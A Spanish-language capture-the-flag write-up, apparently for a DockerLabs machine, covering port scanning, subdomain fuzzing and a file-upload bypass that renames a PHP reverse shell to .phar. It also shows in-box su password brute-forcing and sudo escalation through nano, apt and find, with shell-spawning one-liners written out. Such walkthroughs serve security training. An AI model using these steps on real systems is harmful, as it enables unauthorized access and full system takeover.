# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/40b148ea-a563-4357-a3e8-251fc83ac716)

En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.

### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

2. **80/tcp (HTTP ):** Apache httpd 2.4.52

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Y se encontró un error que dice que no se encontró hidden.lab DNS. Tuve que modificar mi /etc/hosts para que funcionara correctamente.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/772a1143-a2e4-4120-89fb-b7cca6dd7fdf)

# Fase 2- Exploración

#### Feroxbuster
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/eda32117-ca1f-4340-ae0c-cee981ff2866)
Tras no encontrar nada interesante aplicando fuzzing, mas que unos archivos js y css. Así que se procedió a enumerar posibles subdominios.
```ruby
wfuzz -c --hl=9 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.hidden.lab" -u 172.17.0.2
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                              
=====================================================================

000000019:   200        57 L     130 W      1653 Ch     "dev"    
```
Encontramos **dev.hidden.lab**, lo tendremos que añadir también al **/etc/hosts** y lo abriremos en el navegador.

#### Dev
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/4680d51f-c0ea-4e08-825b-21e798dc56af)
Vemos que podemos subir archivos, pero solo con extensión PDF.

# Fase 3- Explotación

#### php?
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/8252b924-40b5-478e-a283-5cf238bac7ee)
Probamos subir un archivo .php con una reverse shell. e interceptar la petición con burpsuite.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/4341d2e5-283e-4e99-88e4-c222adf8a3de)

vamos a cambiar la extensión de .php a .phar que sigue siendo valida para archivos .php.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/4b457d1b-c045-438e-9132-da9515afc0c4)

Y funciono.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/0864b383-a325-4128-b309-b8056a55964c)

Fuimos al directorio /uploads y encontramos los archivos .phar

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/7c8c2b21-b65c-45f5-8ceb-aabce690ea5b)

Al ponernos en modo escucha y ejecutar el archivo funciono, estamos dentro!.

# Fase 4- Privilegios

#### Sudo -l y algo mas...
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/3732a4bd-2a65-413c-90e5-4a7b0a2d717f)

No me deja hacer `sudo -l` y no encontré nada mas en los directorios mas que el nombre de tres usuarios:
```ruby
obby  cafetero  john
```
Vamos a probar realizar fuerza bruta desde adentro de la maquina, para esto subí 2 archivos, rockyou.txt pero reduci su tamaño porque sino no me dejaba. Y Linux-Su-Force.sh.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/ca210409-251d-47a5-9916-98bc49739cea)

Se encontró la contraseña del usuario cafetero.

#### Sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/56407bee-0ace-40ab-a731-63edbd44ec05)

Estando como el usuario cafetero, al hacer un `sudo -l`, vemos que podemos ejecutar como sudo el binario nano.

#### Nano
Ejecutamos sudo -l y vemos que podemos escalar privilegios al usuario John utilizando nano. Usamos GTFObins para encontrar el siguiente comando:

```ruby
sudo -u john /usr/bin/nano
^R^X
reset; sh 1>&0 2>&0
```
Ahora somos John.

#### Bobby
Ahora que somos John. Ejecutamos sudo -l de nuevo y vemos que podemos escalar a Bobby con el binario apt.
Para escalar a Bobby, ejecutamos:
```
sudo -u bobby /usr/bin/apt changelog apt
!/bin/sh
```

Finalmente, usamos el binario find para escalar a root con el siguiente comando:
```ruby
sudo -u root /usr/bin/find . -exec /bin/sh \; -quit
```
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/04c25423-3b90-4bda-9293-3fa5d2289c24)

